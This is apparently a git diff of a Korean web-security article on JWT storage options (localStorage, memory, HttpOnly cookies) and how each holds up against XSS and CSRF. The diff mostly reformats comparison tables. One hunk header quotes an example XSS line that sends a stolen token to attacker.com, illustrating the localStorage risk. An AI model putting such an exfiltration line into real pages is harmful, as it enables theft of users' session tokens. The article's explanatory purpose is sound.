@@ -92,11 +92,11 @@ fetch('https://attacker.com/steal?token=' + stolen);
 
 반면 CSRF는 `Authorization` 헤더를 브라우저가 자동으로 붙이지 않으므로 **CSRF에는 안전하다.**
 
-||localStorage|
-|---|---|
-|XSS|취약 (JS로 직접 접근)|
-|CSRF|안전 (브라우저 자동 전송 안 함)|
-|영속성|탭/브라우저 닫아도 유지|
+|      | localStorage        |
+| ---- | ------------------- |
+| XSS  | 취약 (JS로 직접 접근)      |
+| CSRF | 안전 (브라우저 자동 전송 안 함) |
+| 영속성  | 탭/브라우저 닫아도 유지       |
 
 ---
 
@@ -124,7 +124,7 @@ async function getCart() {
 
 새로고침, 탭 닫기, 브라우저 종료 시 토큰이 소멸한다. 매번 다시 로그인해야 한다는 뜻이다. 실무에서 단독으로 쓰기 어렵고, Refresh Token과 조합한다.
 
-||메모리|
+| |메모리|
 |---|---|
 |XSS|가장 강함 (직접 접근 불가)|
 |CSRF|안전|
@@ -139,8 +139,8 @@ async function getCart() {
 
 HTTP/1.1 200 OK
 Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Strict; Max-Age=900
-            │              │        │          │              │
-            JWT 값         JS접근X   HTTPS만    CSRF방어      15분 만료
+            │                                       │        │                           │              │
+            JWT 값                     JS접근X   HTTPS만    CSRF방어      15분 만료
 ```
 
 **`HttpOnly` 플래그가 핵심이다.**
@@ -175,7 +175,7 @@ SameSite=Lax:    GET 요청(링크 클릭 등)엔 허용, POST 등에는 차단
 SameSite=None:   모든 요청에 첨부 (Secure와 함께 써야 함)
 ```
 
-||HttpOnly 쿠키|
+| |HttpOnly 쿠키|
 |---|---|
 |XSS|안전 (JS 접근 불가)|
 |CSRF|`SameSite=Strict`으로 방어 가능|
